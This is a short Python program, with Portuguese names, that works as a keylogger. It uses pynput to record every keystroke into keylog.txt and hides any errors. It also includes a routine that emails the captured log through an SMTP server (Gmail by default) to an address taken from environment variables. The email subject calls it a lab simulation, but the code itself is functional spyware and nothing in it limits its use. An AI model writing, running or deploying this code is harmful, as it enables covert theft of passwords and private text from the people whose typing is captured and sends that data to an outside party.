import os
import smtplib
from email.message import EmailMessage
from pynput import keyboard

LOG_FILE = "keylog.txt"


def formatar_tecla(tecla):
    if tecla == keyboard.Key.space:
        return " "
    if tecla == keyboard.Key.enter:
        return "\n"
    if tecla == keyboard.Key.tab:
        return "\t"
    if tecla == keyboard.Key.backspace:
        return "[BACKSPACE]"
    if isinstance(tecla, keyboard.Key):
        return f"[{tecla.name.upper()}]"
    return tecla.char or ""


def on_press(tecla):
    try:
        conteudo = formatar_tecla(tecla)
        with open(LOG_FILE, "a", encoding="utf-8") as arquivo:
            arquivo.write(conteudo)
    except Exception:
        pass


def enviar_email_log():
    remetente = os.getenv("EMAIL_REMETENTE")
    senha_app = os.getenv("EMAIL_SENHA_APP")
    destinatario = os.getenv("EMAIL_DESTINATARIO")
    smtp_server = os.getenv("SMTP_SERVER", "smtp.gmail.com")
    smtp_port = int(os.getenv("SMTP_PORT", "587"))

    if not all([remetente, senha_app, destinatario]) or not os.path.exists(LOG_FILE):
        return

    with open(LOG_FILE, "r", encoding="utf-8") as arquivo:
        corpo = arquivo.read()

    if not corpo.strip():
        return

    msg = EmailMessage()
    msg["Subject"] = "Log de Simulação Keylogger (Lab)"
    msg["From"] = remetente
    msg["To"] = destinatario
    msg.set_content(corpo)

    with smtplib.SMTP(smtp_server, smtp_port) as servidor:
        servidor.starttls()
        servidor.login(remetente, senha_app)
        servidor.send_message(msg)


def iniciar_captura():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    iniciar_captura()